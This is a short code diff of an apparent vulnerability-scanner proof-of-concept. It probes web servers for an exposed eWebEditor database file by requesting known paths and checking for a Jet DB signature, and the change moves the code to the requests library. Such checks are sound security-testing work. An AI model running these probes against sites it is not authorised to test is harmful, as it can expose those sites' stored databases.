@@ -78,10 +78,10 @@ class Poc(ABPoc):
             'editor/db/ewebeditor.mdbeWebEditor/db/ewebeditor.mdb',
             ] 
             for payload in payloads:
-                url = arg + payload
-                code, head, body, error, _ = hh.http('--max-filesize 1024000'+url)                       
-                if code == 200 and 'Standard Jet DB' in body:
-                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
+                url = arg + "/" + payload
+                req = requests.get(url)                       
+                if req.status_code == 200 and 'Standard Jet DB' in req.text:
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
 
         except Exception, e:
